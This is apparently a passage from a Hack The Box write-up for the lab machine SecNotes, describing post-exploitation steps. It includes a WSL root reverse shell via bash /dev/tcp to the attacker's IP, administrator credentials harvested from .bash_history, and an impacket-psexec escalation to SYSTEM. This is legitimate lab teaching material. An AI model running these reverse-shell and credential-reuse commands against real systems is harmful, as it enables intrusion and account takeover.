The `c:\users\tyler\cleanup\cleanup.ps1` PowerShell script is to remove anything except `iisstart.*` in `C:\inetpub\new-site`. Basically it's cleaning up the `new-site` SMB share every 5 minutes.

**Everything inside `tyler`'s home directory:**
```shell
PS C:\inetpub\new-site> gci -Recurse c:\users\tyler
[...]                                                                 
    Directory: C:\users\tyler\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        6/22/2018   3:09 AM           1293 bash.lnk                                                              
-a----         8/2/2021   3:32 AM           1210 Command Prompt.lnk                                                    
-a----        4/11/2018   4:34 PM            407 File Explorer.lnk                                                     
-a----        6/21/2018   5:50 PM           1417 Microsoft Edge.lnk                                                    
-a----        6/21/2018   9:17 AM           1110 Notepad++.lnk                                                         
-ar---        5/25/2023  10:25 PM             34 user.txt                                                              
-a----        8/19/2018  10:59 AM           2494 Windows PowerShell.lnk                                                


    Directory: C:\users\tyler\Favorites


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        6/21/2018   5:49 PM                Links                                                                 
-a----        2/17/2021   7:15 AM            208 Bing.url                                                              


    Directory: C:\users\tyler\Links


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        8/19/2018   3:51 PM            494 Desktop.lnk                                                           
-a----        8/19/2018   3:51 PM            939 Downloads.lnk                                                         


    Directory: C:\users\tyler\Pictures


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-r---        6/21/2018   8:41 AM                Camera Roll                                                           
d-r---        6/21/2018  12:34 PM                Saved Pictures                                                        


    Directory: C:\users\tyler\Searches


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        6/21/2018   8:41 AM            859 winrt--{S-1-5-21-1791094074-1363918840-4199337083-1002}-.searchconnect
                                                 or-ms                                                                 


    Directory: C:\users\tyler\secnotes_contacts


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----         4/9/2021   4:09 AM           1743 check-messages-orig.ps1                                               
-a----         4/9/2021   8:42 AM           1928 check-messages.ps1                                                    
```

**`C:\users\tyler\secnotes_contactscheck-messages.ps1`:**
```powershell
$resp = Invoke-WebRequest 'http://127.0.0.1/' -UseBasicParsing -sessionvariable session
$ip = ((ipconfig | findstr [0-9].\.)[0]).Split()[-1]

while($true) {

  $found_url = 0;

  $locs = @($ip, '127.0.0.1', 'secnotes.htb', 'localhost')
  ForEach ($loc in $locs) {
    $resp = Invoke-WebRequest "http://$loc/" -UseBasicParsing -WebSession $session
    if ($resp.RawContent -like '*Please fill in your credentials to login*') {
      Write-Host "Reseting password and getting cookie for $loc"
      # reset tylers password to {Redacted}
      & 'C:\Program Files\MySQL\MySQL Server 8.0\bin\mysql.exe' -u secnotes -p{Redacted} secnotes -e 'update users set password = \"$2y$10${Redacted}\" where username = \"tyler\";'

      # login
      $resp = Invoke-WebRequest "http://$loc/login.php" -UseBasicParsing -WebSession $session -Method POST -Body @{username='tyler';password='{Redacted}'};
    }
  }
  

  $file = Get-ChildItem "C:\Users\tyler\secnotes_contacts\" -Filter *.txt | Sort-Object CreationTime | Select-Object -First 1
	if ($file) {
		Write-Host "Opening file $($file)..."
		$content = Get-Content $file.FullName
		$content.split(' ') | ForEach-Object { 
			if ($_ -match "^https?://((([\w-]+\.)+[\w-]+)|localhost)(:\d+)?([\w- ./?&%=]*)$") { 
				$url = $matches[0];

				Write-Host "Visiting $($url)"
				try {
				(iwr $url -WebSession $session -TimeoutSec 1 -UseBasicParsing).content
				} catch {
					Write-Host "Page not found"
				}
				if ($url -match "change_pass.php") {
					Write-Host "Found change_pass.php... will sleep 30"
					$found_url = 1
				}
			}
		}
		
		Write-Host "Deleting file $($file)"
		Remove-Item $file.FullName
	}
	
	if ($found_url -eq 1) {
		Write-Host "Sleeping for 30 seconds"
		Start-Sleep -s 30
	} else {
		Write-Host "Sleeping for 5 seconds"
		Start-Sleep -s 5
	}
}
```

More credentials.

**In `tyler`'s Desktop, there's an interesting `bash.lnk` shortcut file:**
```shell
PS C:\inetpub\new-site> type c:\users\tyler\desktop\bash.lnk
L?F w??????V?	?v(???	??9P?O? ?:i?+00?/C:\V1?LIWindows@	???L???LI.h???&WindowsZ1?L<System32B	???L???L<.p?k?System32Z2??LP? bash.exeB	???L<??LU.?Y????bash.exeK-J????C:\Windows\System32\bash.exe"..\..\..\Windows\System32\bash.exeC:\Windows\System32?%?
                                                 ?wN?�?]N?D.??Q???`?Xsecnotesx?<sAA??????o?:u??'?/?x?<sAA??????o?:u??'?/?=	?Y1SPS?0??C?G????sf"=dSystem32 (C:\Windows)?1SPS??XF?L8C???&?m?q/S-1-5-21-1791094074-1363918840-4199337083-1002?1SPS0?%??G�??`????%
	bash.exe@??????
                       ?)
                         Application@v(???	?i1SPS?jc(=?????O??MC:\Windows\System32\bash.exe91SPS?mD??pH?H@.?=x?hH?(?bP
```

This shortcut file will execute `C:\Windows\System32\bash.exe`.

Why there's a Bash shell on Windows?

upon researching, I found [this How-To Greek](https://www.howtogeek.com/249966/how-to-install-and-use-the-linux-bash-shell-on-windows-10/) blog:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230526141311.png)

Ah ha! Windows Subsystem for Linux (WSL)!

> Developers can access the power of both Windows and Linux at the same time on a Windows machine. The Windows Subsystem for Linux (WSL) lets developers install a Linux distribution (such as Ubuntu, OpenSUSE, Kali, Debian, Arch Linux, etc) and use Linux applications, utilities, and Bash command-line tools directly on Windows, unmodified, without the overhead of a traditional virtual machine or dualboot setup. (From [https://learn.microsoft.com/en-us/windows/wsl/install](https://learn.microsoft.com/en-us/windows/wsl/install))

**According to [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---windows-subsystem-for-linux-wsl), we could escalate our privilege!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230526141527.png)

**Let's give it a shot!**
```shell
PS C:\inetpub\new-site> wsl "whoami;id;ifconfig"
root
uid=0(root) gid=0(root) groups=0(root)
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.97  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 dead:beef::6802:8df6:ee6e:55e8  prefixlen 64  scopeid 0x0<global>
        inet6 dead:beef::177  prefixlen 128  scopeid 0x0<global>
        inet6 dead:beef::d553:7e1e:15e0:e22d  prefixlen 128  scopeid 0x0<global>
        inet6 fe80::6802:8df6:ee6e:55e8  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:e4:e7  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 1500
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x0<global>
        loop  (Local Loopback)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Oh? I'm root?

**Now, let's get a shell as root!**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/SecNotes)-[2023.05.26|14:24:05(HKT)]
└> rlwrap -cAr nc -lnvp 53
listening on [any] 53 ...
```

```shell
PS C:\inetpub\new-site> wsl bash -c 'bash -i >& /dev/tcp/10.10.14.26/53 0>&1'
```

```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/SecNotes)-[2023.05.26|14:24:05(HKT)]
└> rlwrap -cAr nc -lnvp 53
listening on [any] 53 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.10.97] 51955
root@SECNOTES:~# whoami;hostname;id;ip a
whoami;hostname;id;ip a
root
SECNOTES
uid=0(root) gid=0(root) groups=0(root)
11: eth0: <BROADCAST,MULTICAST,UP> mtu 1500 group default qlen 1
    link/ether 00:50:56:b9:e4:e7
    inet 10.10.10.97/24 brd 10.10.10.255 scope global dynamic 
       valid_lft forever preferred_lft forever
    inet6 dead:beef::6802:8df6:ee6e:55e8/64 scope global dynamic 
       valid_lft 86397sec preferred_lft 14397sec
    inet6 dead:beef::177/128 scope global dynamic 
       valid_lft 3246sec preferred_lft 3246sec
    inet6 dead:beef::d553:7e1e:15e0:e22d/128 scope global dynamic 
       valid_lft 86397sec preferred_lft 14397sec
    inet6 fe80::6802:8df6:ee6e:55e8/64 scope global dynamic 
       valid_lft forever preferred_lft forever
1: lo: <LOOPBACK,UP> mtu 1500 group default qlen 1
    link/loopback 00:00:00:00:00:00
    inet 127.0.0.1/8 brd 127.255.255.255 scope global dynamic 
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope global dynamic 
       valid_lft forever preferred_lft forever
```

I'm root on WSL!

**In `root`'s home directory, we see it's `.bash_history` file:**
```shell
root@SECNOTES:~# ls -lah
ls -lah
total 8.0K
drwx------ 1 root root  512 Jun 22  2018 .
drwxr-xr-x 1 root root  512 Jun 21  2018 ..
---------- 1 root root  398 Jun 22  2018 .bash_history
-rw-r--r-- 1 root root 3.1K Jun 22  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
drwxrwxrwx 1 root root  512 Jun 22  2018 filesystem
```

```shell
root@SECNOTES:~# cat .bash_history
cat .bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%{Redacted}' \\\\127.0.0.1\\c$
> .bash_history 
less .bash_history
```

Nice!! We found `administrator` credentials!!

**We can escalate to `administrator` via `psexec` from `impacket`:**
```shell
┌[siunam♥earth]-(~/ctf/htb/Machines/SecNotes)-[2023.05.26|14:33:28(HKT)]
└> impacket-psexec administrator:'{Redacted}'@$RHOSTS
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.10.97.....
[*] Found writable share ADMIN$
[*] Uploading file HAGGPruI.exe
[*] Opening SVCManager on 10.10.10.97.....
[*] Creating service Cmft on 10.10.10.97.....
[*] Starting service Cmft.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32> whoami && ipconfig /all
nt authority\system

Windows IP Configuration

   Host Name . . . . . . . . . . . . : SECNOTES
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : htb

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-E4-E7
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::177(Preferred) 
   Lease Obtained. . . . . . . . . . : Thursday, May 25, 2023 10:24:43 PM
   Lease Expires . . . . . . . . . . : Friday, May 26, 2023 12:24:43 AM
   IPv6 Address. . . . . . . . . . . : dead:beef::6802:8df6:ee6e:55e8(Preferred) 
   Temporary IPv6 Address. . . . . . : dead:beef::d553:7e1e:15e0:e22d(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::6802:8df6:ee6e:55e8%11(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.10.10.97(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:6ca8%11
                                       10.10.10.2
   DHCPv6 IAID . . . . . . . . . . . : 369119318
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2C-01-FA-F1-00-50-56-B9-E4-E7
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       1.0.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
   Connection-specific DNS Suffix Search List :
                                       htb
```

I'm `nt authority\system`!

## Rooted

**root.txt:**
```shell
C:\WINDOWS\system32> cd c:\users\administrator\desktop

c:\Users\Administrator\Desktop> type root.txt
{Redacted}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/SecNotes/images/Pasted%20image%2020230526143833.png)

## Conclusion

What we've learned:

1. Enumerating Hidden Files & Directories
2. Discovering Stored Cross-Site Scripting (XSS)
3. Exploiting Second-Order SQL Injection
4. Uploading Reverse Shell Via SMB Share
5. Vertical Privilege Escalation Via Windows Subsystem for Linux (WSL) & Impacket's `pkexec`